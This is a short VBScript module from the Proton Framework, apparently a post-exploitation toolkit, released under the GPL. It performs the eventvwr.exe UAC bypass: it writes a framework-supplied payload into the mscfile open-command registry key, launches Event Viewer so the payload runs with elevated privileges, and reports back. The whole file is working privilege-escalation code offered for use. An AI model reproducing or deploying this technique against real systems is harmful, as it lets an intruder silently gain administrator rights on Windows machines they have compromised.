'            ---------------------------------------------------
'                             Proton Framework              
'            ---------------------------------------------------
'                Copyright (C) <2019-2020>  <Entynetproject>
'
'        This program is free software: you can redistribute it and/or modify
'        it under the terms of the GNU General Public License as published by
'        the Free Software Foundation, either version 3 of the License, or
'        any later version.
'
'        This program is distributed in the hope that it will be useful,
'        but WITHOUT ANY WARRANTY; without even the implied warranty of
'        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
'        GNU General Public License for more details.
'
'        You should have received a copy of the GNU General Public License
'        along with this program.  If not, see <http://www.gnu.org/licenses/>.

sub BypassUACEventVwr
    Const HKEY_CURRENT_USER = &H80000001
    strKeyPath = "Software\Classes\mscfile\shell\open\command"

    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
    objRegistry.CreateKey HKEY_CURRENT_USER, strKeyPath

    objRegistry.SetStringValue HKEY_CURRENT_USER, strKeyPath, "", "~PAYLOAD_DATA~"

    KoRunCmd "eventvwr.exe", true
    KoSleep 10
end sub

BypassUACEventVwr

KoReportWork "Completed"

KoExit
